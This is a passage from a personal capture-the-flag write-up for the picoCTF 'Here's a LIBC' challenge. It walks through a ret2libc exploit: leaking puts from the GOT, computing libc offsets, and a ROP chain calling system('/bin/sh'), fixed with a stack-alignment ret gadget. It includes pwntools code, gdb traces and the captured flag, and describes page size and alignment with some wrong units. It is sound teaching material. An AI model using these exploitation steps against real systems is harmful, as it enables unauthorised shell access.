(Linux Pwn Venv) asdiml@DESKTOP-XXXXXX:~$ ./attempt.py
[+] Starting local process './vuln': pid 2466
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
0\x7fFK*\x7f
WeLcOmE To mY EcHo sErVeR!
$
```

The leaked address should be `FK*\x7f`, just that \x7f is not ASCII-printable. Appending the following code to our script, 

```python
p.recvline() # Ignore unimportant program output
p.recvline()
leak = u64(p.recvline().strip()).ljust(8, b"\x00") # Strip newline, preface bytestring (assume endianness isn't a thing) with null bytes until it is 8 bytes long
log.info(f"{hex(leak)=}")
```

we get: 

```
(Linux Pwn Venv) asdiml@DESKTOP-XXXXXX:~$ ./attempt.py
[+] Starting local process './vuln': pid 2488
[*] hex(leak)='0x7fc81ca00f30'
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
$
```

As seen, the hexadecimal value of the leak is logged. 

> **Note**
> log.info() adds the leading [*] to the output so we can ascertain that it is from our Python script and not the executable

Now, we can calculate the offset between the leaked function and desired function in libc. To do that, we will first find the base address of libc, which is can achieve by finding the address of scanf within the libc used. Thus, we run `readelf -s ./libc.so.6 | grep scanf`, where -s flag displays the symbol table, giving: 

```
asdiml@DESKTOP-XXXXXX:~$ readelf -s ./libc.so.6 | grep scanf
   440: 0000000000082df0    20 FUNC    GLOBAL DEFAULT   13 vwscanf@@GLIBC_2.2.5
   469: 0000000000073510     7 FUNC    WEAK   DEFAULT   13 vfscanf@@GLIBC_2.2.5
   793: 0000000000088870    20 FUNC    WEAK   DEFAULT   13 vscanf@@GLIBC_2.2.5
   993: 0000000000082d30   177 FUNC    GLOBAL DEFAULT   13 fwscanf@@GLIBC_2.2.5
  1364: 000000000007b180   177 FUNC    GLOBAL DEFAULT   13 sscanf@@GLIBC_2.2.5
  1408: 000000000007afe0     7 FUNC    WEAK   DEFAULT   13 vfwscanf@@GLIBC_2.2.5
  1479: 000000000007aff0   177 FUNC    GLOBAL DEFAULT   13 fscanf@@GLIBC_2.2.5
  1642: 0000000000083020   177 FUNC    GLOBAL DEFAULT   13 swscanf@@GLIBC_2.2.5
  1960: 0000000000081790   163 FUNC    WEAK   DEFAULT   13 vsscanf@@GLIBC_2.2.5
  2062: 000000000007b0b0   197 FUNC    GLOBAL DEFAULT   13 scanf@@GLIBC_2.2.5
  2115: 0000000000082f70   168 FUNC    GLOBAL DEFAULT   13 vswscanf@@GLIBC_2.2.5
  2219: 0000000000082c60   197 FUNC    GLOBAL DEFAULT   13 wscanf@@GLIBC_2.2.5
```

Thus, our scanf address is offset from libc's base address by 0x7b0b0. Using the same method to find the offset of system, we run `readelf -s ./libc.so.6 | grep system`, which gives: 

```
asdiml@DESKTOP-XXXXXX:~$ readelf -s ./libc.so.6 | grep system
1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

Thus, the offset of the system function from libc's base address is 0x4f4e0. With this, we can calculate the address of the system fuction. Now, we need a way to feed the string "/bin/sh". If you think about it, "/bin/sh" must exist inside libc (this can be proven by running the command `strings libc.so.6 | grep /bin/sh`). To find the offset of "/bin/sh" in libc, we simply open libc.so.6 in Ghidra and search for the string "/bin/sh". Clicking on the address, we see: 

```
        002b40fa 2f              ??         2Fh    /
        002b40fb 62              ??         62h    b
        002b40fc 69              ??         69h    i
        002b40fd 6e              ??         6Eh    n
        002b40fe 2f              ??         2Fh    /
        002b40ff 73              ??         73h    s
        002b4100 68              ??         68h    h
```

> **WARNING**
> Ghidra opens files at an offset of 0x100000, so this address is really supposed to be 0x1b40fa. This will cause issues as you will see later. 

The offset of bin_sh in libc is 0x2b40fa. Now we can create the second rop chain payload (remember, we used the first payload to return to main) as follows, to call system with the argument of "/bin/sh": 

```python
payload2 = [
    pre_payload,
    p64(pop_rdi_gadget_addr),
    p64(binsh_addr),
    p64(system_addr)
]
payload2 = b''.join(payload2)
```

Running the entire script sending both payloads, we get: 

```bash
(Linux Pwn Venv) asdiml@DESKTOP-XXXXXX:/mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC$ ./attempt.py
[+] Starting local process './vuln_patched': pid 2659
[*] hex(leak)='0x7fd8d5696f30'
[*] hex(libc_base_addr)='0x7fd8d561be80'
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
[*] Got EOF while reading in interactive
$
```

and the shell exits no matter what we enter. Thus, there seems to be a bug. We can use the line `gdb.attach(p)` to attach a gdb instance to the executable running in pwntools. Then, we set a breakpoint at the end of do_stuff(), which from Ghidra, is 0x400770. We can do this by entering, in the attached gdb window, the command `b *0x400770`. We can use the continue command `c` to let the executable run until a breakpoint is reached. This is what happens when we check the value of $rdi after the second payload's pop_rdi gadget is supposed to have put the binsh address into $rdi: 

```
0x0000000000400914 in __libc_csu_init ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x7a
$rbx   : 0x0
$rcx   : 0x00007f76734b1264  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007f767378e8c0  →  0x0000000000000000
$rsp   : 0x00007ffcf4bdd908  →  0x00007f76733f1360  →   cmp DWORD PTR [rsp+0x8], 0x1
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f767378d7e3  →  0x78e8c0000000000a ("\n"?)
$rdi   : 0x00007f7673655f7a  →  0x00007f7673655f7a
$rip   : 0x0000000000400914  →  <__libc_csu_init+100> ret
$r8    : 0x79
$r9    : 0x0
$r10   : 0x0
$r11   : 0x246
$r12   : 0x1b
$r13   : 0x0
$r14   : 0x1b
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcf4bdd908│+0x0000: 0x00007f76733f1360  →   cmp DWORD PTR [rsp+0x8], 0x1         ← $rsp
0x00007ffcf4bdd910│+0x0008: 0x6556724573206f00
0x00007ffcf4bdd918│+0x0010: 0x0000000000002152 ("R!"?)
0x00007ffcf4bdd920│+0x0018: 0x00007f767378d7e3  →  0x78e8c0000000000a ("\n"?)
0x00007ffcf4bdd928│+0x0020: 0x000000010000000a ("\n"?)
0x00007ffcf4bdd930│+0x0028: "Welcome to my echo server!"
0x00007ffcf4bdd938│+0x0030: "to my echo server!"
0x00007ffcf4bdd940│+0x0038: "ho server!"
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40090e <__libc_csu_init+94> pop    r13
     0x400910 <__libc_csu_init+96> pop    r14
     0x400912 <__libc_csu_init+98> pop    r15
 →   0x400914 <__libc_csu_init+100> ret
   ↳  0x7f76733f1360                  cmp    DWORD PTR [rsp+0x8], 0x1
      0x7f76733f1365                  je     0x7f76733f2163
      0x7f76733f136b                  mov    rdx, QWORD PTR [rsp+0x60]
      0x7f76733f1370                  movzx  eax, BYTE PTR [rdx]
      0x7f76733f1373                  test   al, al
      0x7f76733f1375                  je     0x7f76733f13a8
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln_patched", stopped 0x400914 in __libc_csu_init (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400914 → __libc_csu_init()
[#1] 0x7f76733f1360 → cmp DWORD PTR [rsp+0x8], 0x1
[#2] 0x7ffcf4bde1ba → push rax
[#3] 0x7ffcf4bde1e1 → rex.WR
[#4] 0x7ffcf4bde1f0 → rex.W
[#5] 0x7ffcf4bde202 → rex.WR
[#6] 0x7ffcf4bde20f → push rdi
[#7] 0x7ffcf4bde230 → rex.WR push rbx
[#8] 0x7ffcf4bde81f → push rsi
[#9] 0x7ffcf4bde853 → push rdi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/gx $rdi
0x7f7673655f7a: Cannot access memory at address 0x7f7673655f7a
```

Clearly, since $rdi isn't a proper memory addresses, something went wrong. If we print the libc base address we calculated with `log.info(f"{hex(libc_base_addr)=}")`, we realise that libc_base_addr is wrong: 

```
[*] hex(libc_base_addr)='0x7f76733a1e80'
```

Processes in the OS are stored in fixed-size blocks called pages of 4kb (4096 bits, or 0x1000 bits), so the last three hexadecimal digits of libc_base_addr should be 000. Since libc_base_addr is calculated from our scanf leak, that is likely to be the problem. We run the program with the gdb attachment again, break at main, and run `x 0x7fdd78983f30` where "0x7fdd78983f30" is the leaked address that defers every run. 

```
gef➤  x 0x7fdd78983f30
0x7fdd78983f30 <__isoc99_scanf>:        0xfa894953
```

We see that __isoc99_scanf is not scanf. Searching for that version of scanf in libc using `readelf -s ./libc.so.6 | grep iso`, we find that it is not very easy (at least according to the Youtube tutorial https://www.youtube.com/watch?v=tMN5N5oid2c) to find the function we're looking for: 

```bash
(Linux_Pwn_Venv) asdiml@DESKTOP-XXXXXX:~$ readelf -s ./libc.so.6 | grep iso
   282: 000000000007c550   177 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
   412: 000000000007bf30   475 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
   571: 00000000000cccd0   177 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
   581: 00000000000ccba0   289 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
   863: 000000000007c610   168 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
  1084: 00000000000cc6b0   475 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
  1120: 000000000007c250   457 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
  1252: 00000000000ccd90   173 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
  1674: 00000000000cc890   312 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
  1711: 000000000007c420   289 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
  2092: 000000000007c110   312 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
  2288: 00000000000cc9d0   457 FUNC    GLOBAL DEFAULT   13 __iso[...]@@GLIBC_2.7
```

Let's instead leak puts. Looking at .got.plt in Ghidra, we have

```
                            PTR_puts_00601018                               XREF[1]:     puts:00400540   
        00601018 00  20  60       addr       <EXTERNAL>::puts                                 = ??
                 00  00  00 
                 00  00
```

Weirdly formatted, but now we know we need to leak the value at address 0x601018 (which will be the address of puts at runtime). We also need to get the offset of puts in libc.so.6: 

```bash
(Linux_Pwn_Venv) asdiml@DESKTOP-XXXXXX:~$ readelf -s ./libc.so.6 | grep puts
   191: 0000000000080a30   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   496: 0000000000126870  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   678: 0000000000128780   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
  1141: 000000000007f260   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
```

The offset is 0x80a30. Putting everything together and running, we see that the libc base address is correct now, yet the shell is still not working: 

```bash
(Linux_Pwn_Venv) asdiml@DESKTOP-XXXXXX:/mnt/d/CTFs/picoCTF/Pwn/heresalibc$ ./attempt.py
[+] Starting local process './vuln_patched': pid 947
[*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln_patched', '947']
[+] Waiting for debugger: Done
[*] hex(leak)='0x7ff37de14a30'
[*] hex(libc_base_addr)='0x7ff37dd94000'
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
$ ls
$ whoami
$ pwd
```

At this point, it is noted that the "0A" byte in the offset of puts in libc that represents the newline character could be causing problems since scanf will read until a newline character, as seen in do_stuff() from Ghidra: 

```c
__isoc99_scanf("%[^\n]", allocated_buffer);
```

However, in the tutorial, even after puts is changed to setbuf, the error still persists. Thus, we need to take a closer look and step through the program slowly with the attached gdb debugger. We realize that the first payload works fine, gdb shows that our puts offset and address is correct, etc. However, if we print out the stack after the second run of main() by (1) copying the $rsi value just as scanf is called, 

```
0x00000000004006fe in do_stuff ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007f2370a5f264  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007f2370d3c8c0  →  0x0000000000000000
$rsp   : 0x00007ffe4dd21880  →  0x00007f2370d3b7e3  →  0xd3c8c0000000000a ("\n"?)
$rbp   : 0x00007ffe4dd21910  →  0x00007ffe4dd219c0  →  "AAAAAAAA"
$rsi   : 0x00007ffe4dd21890  →  0x00007ffe4dd21920  →  "WeLcOmE To mY EcHo sErVeR!"
$rdi   : 0x0000000000400934  →  0x6325005d0a5e5b25 ("%[^\n]"?)
$rip   : 0x00000000004006fe  →  <do_stuff+38> call 0x400580 <__isoc99_scanf@plt>
$r8    : 0x1a
$r9    : 0x00007f2370f66540  →  0x00007f2370f66540  →  [loop detected]
$r10   : 0x0
$r11   : 0x246
$r12   : 0x1b
$r13   : 0x0
$r14   : 0x1b
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe4dd21880│+0x0000: 0x00007f2370d3b7e3  →  0xd3c8c0000000000a ("\n"?)    ← $rsp
0x00007ffe4dd21888│+0x0008: 0x00007f23709dbfc1  →  <_IO_do_write+177> mov rbp, rax
0x00007ffe4dd21890│+0x0010: 0x00007ffe4dd21920  →  "WeLcOmE To mY EcHo sErVeR!"  ← $rsi
0x00007ffe4dd21898│+0x0018: 0x00007f2370d3b760  →  0x00000000fbad2887
0x00007ffe4dd218a0│+0x0020: 0x000000000000000a ("\n"?)
0x00007ffe4dd218a8│+0x0028: 0x00007ffe4dd21920  →  "WeLcOmE To mY EcHo sErVeR!"
0x00007ffe4dd218b0│+0x0030: 0x00007f2370d372a0  →  0x0000000000000000
0x00007ffe4dd218b8│+0x0038: 0x000000000000001b
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4006ef <do_stuff+23>    mov    rsi, rax
     0x4006f2 <do_stuff+26>    lea    rdi, [rip+0x23b]        # 0x400934
     0x4006f9 <do_stuff+33>    mov    eax, 0x0
 →   0x4006fe <do_stuff+38>    call   0x400580 <__isoc99_scanf@plt>
   ↳    0x400580 <__isoc99_scanf@plt+0> jmp    QWORD PTR [rip+0x200ab2]        # 0x601038 <__isoc99_scanf@got.plt>
        0x400586 <__isoc99_scanf@plt+6> push   0x4
        0x40058b <__isoc99_scanf@plt+11> jmp    0x400530
        0x400590 <_start+0>       xor    ebp, ebp
        0x400592 <_start+2>       mov    r9, rdx
        0x400595 <_start+5>       pop    rsi
─────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
__isoc99_scanf@plt (
   $rdi = 0x0000000000400934 → 0x6325005d0a5e5b25 ("%[^\n]"?),
   $rsi = 0x00007ffe4dd21890 → 0x00007ffe4dd21920 → "WeLcOmE To mY EcHo sErVeR!",
   $rdx = 0x00007f2370d3c8c0 → 0x0000000000000000,
   $rcx = 0x00007f2370a5f264 → 0x5477fffff0003d48 ("H="?)
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln_patched", stopped 0x4006fe in do_stuff (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006fe → do_stuff()
[#1] 0x4008a0 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

(the $rsi value is 0x00007ffe4dd21890), (2) run the next instruction `ni` command to jump past scanf, and (3) run the command `telescope 0x00007ffe4dd21890 -l 64`, we can see the part of the stack that matters to us: 

```
0x00007ffe4dd21918│+0x0030: 0x0000000000400913  →  <__libc_csu_init+99> pop rdi
0x00007ffe4dd21920│+0x0038: 0x00007f2370c030fa  →  0x00007f2370c030fa
0x00007ffe4dd21928│+0x0040: 0x00007f237099e4e0  →  <system+0> test rdi, rdi
```

The pop-rdi gadget, as well as system function from libc, are recognized but the /bin/sh address is not. Thus, that is the problem and we can use gef's grep function to find the address of /bin/sh within the program i.e. `grep /bin/sh`. This gives us 

```bash
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/mnt/d/CTFs/picoCTF/Pwn/heresalibc/libc.so.6'(0x7f237094f000-0x7f2370b36000), permission=r-x
  0x7f2370b030fa - 0x7f2370b03101  →   "/bin/sh"
```

which we can use to find the /bin/sh offset to correct our script. We do some arithmetic in gdb, subtracting the libc_base_addr taken from `vm` from the /bin/sh address, and get: 

```
gef➤  p 0x7f2370b030fa - 0x00007f237094f000
$3 = 0x1b40fa
```

Changing the /bin/sh offset accordingly and running, it still does not work. There is an attempt to connect to the remote to see if the libc linker is causing issues, but that is not the case. A stack alignment issue is the next guess, so we try to find a gadget that simply returns with the command `ROPgadget --binary vuln | grep ": ret"`: 

```bash
(Linux_Pwn_Venv) asdiml@DESKTOP-XXXXXX:~$ ROPgadget --binary vuln | grep ": ret"
0x000000000040052e : ret
0x0000000000400562 : ret 0x200a
0x00000000004007fd : ret 0x8348
0x0000000000400552 : retf 0x200a
```

We then add the first address 0x40052e to our second payload, before system_addr. The rationale for this is that for more modern Ubuntu libcs, there will be certain instructions requiring $rsp to be 16-bit aligned, which means that the last hexadecimal digit of $rsp must be 0. Since $rsp increments and decrements by 8 in an operation, if stack alignment is really the issue, we simply need to perform an extra return operation to increment $rsp from ending with 8 to ending with 0 (i.e. clearing the last nibble). 

Running the script, we are now able to gain acccess to the directory: 

```bash
(Linux_Pwn_Venv) asdiml@DESKTOP-XXXXXX:~$ ./attempt.py
[+] Starting local process './vuln_patched': pid 1189
[*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln_patched', '1189']
[-] Waiting for debugger: Debugger did not attach to pid 1189 within 15 seconds
[*] hex(leak)='0x7ff180d27a30'
[*] hex(libc_base_addr)='0x7ff180ca7000'
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
$ ls
Makefile    connect.sh    libc.so.6  vuln
attempt.py  ld-2.27.so    notes.md   vuln_patched
```

Connecting to the remote now, we finally get our flag: 

```bash
(Linux_Pwn_Venv) asdiml@DESKTOP-XXXXXX:/mnt/d/CTFs/picoCTF/Pwn/heresalibc$ ./attempt.py
[+] Opening connection to mercury.picoctf.net on port 24159: Done
[*] hex(leak)='0x7f69fa687a30'
[*] hex(libc_base_addr)='0x7f69fa607000'
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_f2ac531bbb3a68ed}$
```